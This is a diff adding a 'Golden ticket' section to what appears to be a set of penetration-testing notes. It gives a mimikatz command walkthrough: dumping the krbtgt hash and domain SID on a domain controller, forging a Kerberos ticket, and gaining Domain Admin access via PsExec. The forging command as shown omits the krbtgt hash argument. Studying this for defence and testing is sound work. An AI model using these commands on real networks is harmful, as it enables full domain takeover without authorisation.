@@ -136,6 +136,32 @@ Reference: https://learn.microsoft.com/en-us/previous-versions/windows/desktop/m
 
 ### Golden ticket
 
+Kerberos service account: `krbtgt`
+Mimikatz on GitHub:
+- https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump
+- https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos
+
+Takes a Domain Admin account on the Domain Controller, or have compromised the Domain Controller:
+```
+SomeWorkstation c:\path\to\sysinternalsuite > .\PsExec64.exe \\TargetDomainController cmd.exe # access denied
+
+DomainController c:\path\to\mimikatz > .\mimikatz.exe # on the Domain Controller, with a Domain Admin account
+DC mimikatz # privilege::debug
+DC mimikatz # lsadump::lsa /patch # search for the krbtgt service NTLM hash, and get the domain SID: S-1-5-21-x-y-z
+
+SomeWorkstation c:\path\to\mimikatz > mimikatz.exe # on a workstation, with a random user account
+DC mimikatz # kerberos::purge
+DC mimikatz # kerberos::golden /user:targetuserondc /domain:somedomainname.com /sid:S-1-5-21-x-y-z
+SomeWorkstation c:\path\to\sysinternalsuite > .\PsExec64.exe \\TargetDomainController cmd.exe # access granted on the Domain Controller
+DomainController c:\any\path > ipconfig
+c:\any\path > whoami # targetuserondc
+c:\any\path > whoami /groups # expected "somedomainname\Domain Admins"
+
+SomeWorkstation c:\path\to\sysinternalsuite > .\PsExec64.exe \\TargetDomainControllerIpAddress cmd.exe # access denied, the IP address triggers an NTLM authentication
+```
+
+Reference: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It.pdf
+
 ### Shawdow copies
 
 
